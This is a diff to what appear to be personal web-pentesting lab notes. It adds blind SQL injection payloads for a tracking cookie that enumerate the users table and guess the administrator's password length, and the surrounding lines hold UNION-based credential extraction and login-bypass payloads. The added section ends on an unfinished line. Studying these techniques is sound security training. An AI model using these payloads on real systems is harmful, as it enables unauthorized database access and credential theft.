@@ -164,8 +164,12 @@ sudo openvpn nmap -sV {target IP}
 - {'+union+select+username,password+from+users+where+username='administrator'--} --select password belonging to a specific user
 
 **BLIND SQLi**
-[+] test request cookies tracking ID with a FALSE statement and note changes
-
+[+] test request cookies tracking ID with a FALSE statement(' anD 1=2--) then enter and FORWARD request and note changes
+[+] {' anD (SELECT 'a' FROM users LIMIT 1)='a'--} -- select users table from tracking ID
+[+] {' anD (SELECT 'a' FROM users WHERE username='administrator')='a'--} --select a specific user from user_column
+[+] {' anD (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a'--} --guessing userpass length from DB table
+- you can change the value of the password length and also change the '>' to '='
+[+] {
 
 [+] test login with {'} if internal error shows then it allows SQLi
 [+] {' or 1=1--} -- bypass login page pass
